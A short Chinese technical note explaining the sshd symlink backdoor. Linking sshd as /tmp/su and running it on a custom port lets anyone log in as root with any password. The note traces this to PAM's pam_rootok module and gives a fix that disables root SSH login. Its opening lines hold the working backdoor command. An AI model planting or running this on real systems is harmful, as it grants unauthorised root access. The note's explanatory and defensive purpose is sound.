# ssh软连接漏洞
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=12345;
- 在另一台机器上执行：
root@192.168.1.30 -p 12345
随意输入密码即可登陆
只允许命名为su，命名其他尝试登录都不成功
当前测试的系统(centos7 ,debian8, 只要允许root 远程登陆，基本上都可以适用)，端口也可以换成别的
当前解决办法，禁止root 远程登陆
原因是:基于pam认证的，使用了pam中的su，调用的是/etc/pam.d/su,su的认证使用了pam_rootok.so认证模块是认证你的UID是否为0，他会return pam的结果
- 他先会调用getuid()，如果get的uid为0，他会检查selinux的root是否为0或是否启用selinux下为0，返回认证成功，否则认证失败。源代码122行：https://fossies.org/dox/Linux-PAM-1.3.0/pam__rootok_8c_source.html

```
sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config || sed -i 's/^#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sudo /etc/init.d/sshd restart || sudo systemctl restart sshd
root@dh-pc:/etc/pam.d# cat -n  su
     1	#
     2	# The PAM configuration file for the Shadow `su' service
     3	#
     4	
     5	# This allows root to su without passwords (normal operation)
     6	auth       sufficient pam_rootok.so
root@dh-pc:/etc/pam.d# locate pam_rootok.so
/lib/x86_64-linux-gnu/security/pam_rootok.so

root@dh-pc:/etc/pam.d# egrep  -irn pam_rootok.so ./*
./chfn:7:auth		sufficient	pam_rootok.so
./chsh:12:auth		sufficient	pam_rootok.so
./runuser:2:auth		sufficient	pam_rootok.so
./su:6:auth       sufficient pam_rootok.so
./su:13:# permitted earlier by e.g. "sufficient pam_rootok.so").
```

- 通过查找其实不单单是su存在pam_rootok,只要满足了上述的三个条件都可以进行"任意密码登录"。
